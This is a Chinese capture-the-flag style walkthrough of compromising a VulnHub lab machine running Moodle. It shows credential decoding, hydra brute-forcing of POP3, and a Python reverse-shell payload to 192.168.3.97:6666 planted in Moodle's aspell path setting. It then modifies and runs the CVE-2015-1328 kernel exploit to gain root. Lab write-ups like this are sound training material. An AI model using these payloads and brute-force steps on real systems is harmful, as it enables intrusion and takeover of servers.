#信息收集
![image.png](https://upload-images.jianshu.io/upload_images/9177635-6e0f54ac0f71031c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
安装好靶机以后，netdiscover检测到目标ip地址为：192.168.3.131
快速扫描靶机提供的服务：
![image.png](https://upload-images.jianshu.io/upload_images/9177635-5de2d660f551a176.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
只探测到了80端口和25端口。ok，打开http服务查看一下：
![image.png](https://upload-images.jianshu.io/upload_images/9177635-dd7fe49793570605.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
显示在/sev-home/里有登录模块，打开查看，有一个http的验证框
![image.png](https://upload-images.jianshu.io/upload_images/9177635-04066c5ebf1a1928.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
关掉验证框，回到首页，查看html的源代码：
![image.png](https://upload-images.jianshu.io/upload_images/9177635-95c0ed3d28ebc39f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
发现一个叫terminal.js的东西，点击查看：
![image.png](https://upload-images.jianshu.io/upload_images/9177635-3fb8660a3f65b309.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
在注释里，我们得到了两个用户名：boris和natalya，以及一串看起来是被加密的密码：
```&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;```
直接把上面这串东西丢到，谷歌输入框直接就解码成了明文：
![image.png](https://upload-images.jianshu.io/upload_images/9177635-ce51a4d6efd7dd16.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
密码是：```InvincibleHack3r```
现在我们用boris：InvincibleHack3r登录上面的/sev-home/，得到页面：
![image.png](https://upload-images.jianshu.io/upload_images/9177635-36ea0c88ef0fb166.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
留意文字，期中提到：
*Remember, since security by obscurity is very effective, we have configured our pop3 service to run on a very high non-default port*
有一个pop3服务开启了，但不是放在默认的端口（110），我们上面只扫到了80和25端口，看来要全端口扫描一次：
执行：
```nmap -sS -sV -p 1~65535 -A 192.168.3.131```
![image.png](https://upload-images.jianshu.io/upload_images/9177635-6a2cd9073b0f1f5d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
再次扫出两个高段的端口，55006看上去是开启了ssl服务，那55007应该就是pop3服务的端口
虽然nmap这里没有显示出来，但是可以用msf验证一下：
![image.png](https://upload-images.jianshu.io/upload_images/9177635-5ef7f2c3ccf674d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
成功验证55007位pop3端口

在http://192.168.3.131/sev-home/里，第二段话内容被加粗了，看起来邮箱里会有些什么线索。
![image.png](https://upload-images.jianshu.io/upload_images/9177635-db193477aad4e0f6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

多说两句smtp和pop3服务，smtp是邮件服务器之间的通信协议，pop3是个人与邮件服务器之间的通信协议。
比如说我和小明通信，我用的是Gmail邮箱 服务，小明用的是QQ邮箱服务，我给小明发一封邮件。Gmail投递到QQ的邮件服务器，用的是smtp服务，小明登录自己的账号拉取邮件的时候用的就是pop3服务。
#攻击
只要我们知道了用户名和密码，就可以通过pop3协议登录个人的邮箱，查看邮件内容。那么现在，我们根据上面收集到的两个用户名boris和natalya，制作成一个用户字典user.txt，再用hydra爆破这两个账号的pop3密码
执行：```hydra -L /root/user.txt -P /usr/share/wordlists/fasttrack.txt pop3://192.168.3.131 -s 55007```
![image.png](https://upload-images.jianshu.io/upload_images/9177635-9115d82bbc2fac55.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
成功爆破到两个账号的密码：
```login: boris   password: secret1!```
```login: natalya   password: bird```

用telnet 192.168.3.131 55007登录boris的邮箱，发现有三封邮件
![image.png](https://upload-images.jianshu.io/upload_images/9177635-153116896e40461e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

逐一查看邮件：
![image.png](https://upload-images.jianshu.io/upload_images/9177635-3336aafe092faf56.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
没有太多有用的信息，登录natalya的账号：
![image.png](https://upload-images.jianshu.io/upload_images/9177635-7bd5820fcf6369c3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
有两份邮件，查看：
![image.png](https://upload-images.jianshu.io/upload_images/9177635-798afb54f6688bfe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
发现了一组登录信息，并且邮件里说/gnocertdir/是登陆的网站，不过需要在本地host文件里，把这个域名和域名做绑定，否则会被重定向到某个网站，把这行添加到host里面：
![image.png](https://upload-images.jianshu.io/upload_images/9177635-a7d3a602e300fd73.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
ok,打开/gnocertdir/，显示一个登陆页面
![image.png](https://upload-images.jianshu.io/upload_images/9177635-f9f334ae1a774c9c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
用上面的信息登录
username: xenia
password: RCP90rulez!
![image.png](https://upload-images.jianshu.io/upload_images/9177635-3aeac128ff7e0e91.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
显示一个叫moodle的cms的后台，我尝试在这个后台里找了很多可以上传后门的攻击点，都一一失败了，上传后的文件只能供下载，不能查看。看来此路不通。
线上搜索moodle的可利用漏洞，msf里有一个现成的，但貌似不行。心灰意冷之际，随便查看了一下这个后台的其他模块，发现了一封站内邮件：
![image.png](https://upload-images.jianshu.io/upload_images/9177635-52f1b7fd0f030414.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
看来是一个叫doak的管理员发来的信件，ok，现在我们又找到一个用户名，再次爆破这个用户的邮件密码：
![image.png](https://upload-images.jianshu.io/upload_images/9177635-89bc01d56cd4c224.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
得到登录信息：``` login: doak   password: goat```
登录这个账号的邮箱，查看邮件
![image.png](https://upload-images.jianshu.io/upload_images/9177635-87f3c3bffbd14bfa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
再次得到一个后台管理人员的登陆信息：
```username: dr_doak password: 4England!```
用这个信息登录后台，看到一个私密文件```s3cret.txt```：
![image.png](https://upload-images.jianshu.io/upload_images/9177635-55e2b2054b9cd2d4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
按照提示，在url打开/dir007key/for-007.jpg，显示一张图片：
![image.png](https://upload-images.jianshu.io/upload_images/9177635-3870b41824a7ac4e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
底下一行文字显示：```picked up a lift access key```，应该是提示在图片里找线索，把图片下载到本地查看属性，发现标题被加密了，看样子像base64加密的
![image.png](https://upload-images.jianshu.io/upload_images/9177635-ffcda5efe9b67343.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
用hackbar工具解密出来
![image.png](https://upload-images.jianshu.io/upload_images/9177635-e99ced909dc1276e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
得到明文：```xWinter1995x!```
用账号admin尝试登陆，登陆成功，超级管理员账号下多了几个模块。
![image.png](https://upload-images.jianshu.io/upload_images/9177635-63dc0e3045131295.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

在admin下的攻击我枚举了很久，最后还是参考了网上其他大佬的方法。
首先：
在Home / ► Site administration / ► Plugins / ► Text editors / ► TinyMCE HTML editor下，把Spell engine设置为Pspellshell
![image.png](https://upload-images.jianshu.io/upload_images/9177635-fd489337dcf276f9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
第二步，构建一个反弹shell，payload为：
```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.3.97",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```

当然IP和端口要换成你自己的。

去到Home / ► Site administration / ► Server / ► System paths
把上面的payload放到Path to aspell
![image.png](https://upload-images.jianshu.io/upload_images/9177635-e9bc8b13af0e2483.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

第三步,在攻击机开启nc监听：```nc -lvp 6666```
![image.png](https://upload-images.jianshu.io/upload_images/9177635-bbb90c108dc61914.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

第四步，在后台点击任何一个富文本编辑器，点击拼写检查按钮，就是圈起来的那个地方：
![image.png](https://upload-images.jianshu.io/upload_images/9177635-b7bc662ab57cc3f8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

成功获得一个反弹shell
![image.png](https://upload-images.jianshu.io/upload_images/9177635-6b9b4e4234cea865.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


   #提权
查看靶机内核
![image.png](https://upload-images.jianshu.io/upload_images/9177635-4baebd4574d1325e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
显示内核版本为：Linux ubuntu 3.13.0-32-generic 
在攻击机开启一个http服务，从靶机下载les.sh到本地，枚举提权漏洞

![image.png](https://upload-images.jianshu.io/upload_images/9177635-6a4d226db16ac684.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

选择内核版本和靶机一样的CVE-2015-1328
![image.png](https://upload-images.jianshu.io/upload_images/9177635-4b9a9c08ed936f57.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
编译以后传到靶机，发现失败了
![image.png](https://upload-images.jianshu.io/upload_images/9177635-014c195b9e46026c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
提示靶机没有gcc编译，我们查看攻击代码，发现其中有一行为：
![image.png](https://upload-images.jianshu.io/upload_images/9177635-b3a648e92249f7bf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
这里有需要用到gcc命令，我们把
```lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");```
改为：
```lib = system("cc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");```
编译，下载，执行
![image.png](https://upload-images.jianshu.io/upload_images/9177635-4a53e14e463a8f77.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
拿到root权限
查找flag，需要用ls -alh显示隐藏文件
![image.png](https://upload-images.jianshu.io/upload_images/9177635-f6d311e7d12fd374.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
根据.flag.txt提示打开http://severnaya-station.com/006-final/xvf7-flag/
![image.png](https://upload-images.jianshu.io/upload_images/9177635-bdbc82df24f542bf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

#总结
感觉vulnhub的靶机都是这种风格，一环接一环，像寻宝一样，真实环境的渗透，可能不太会有这种情况，不过当一个游戏玩的话，每找到一个新的线索时还是挺令人兴奋的。
攻击手段算是开了眼界，再也不是msf一把唆，但是攻击原理后面还是要再深入了解一下。。
提权的时候要学位根据错误提示修改提权脚本，这台靶机没有gcc编译，但是支持cc编译。cc是Unix系统的C Compiler，而gcc则是GNU Compiler Collection，属于linux。这些都要靠积累，不是C/C++程序员可能不太清楚这之间的联系和分别。





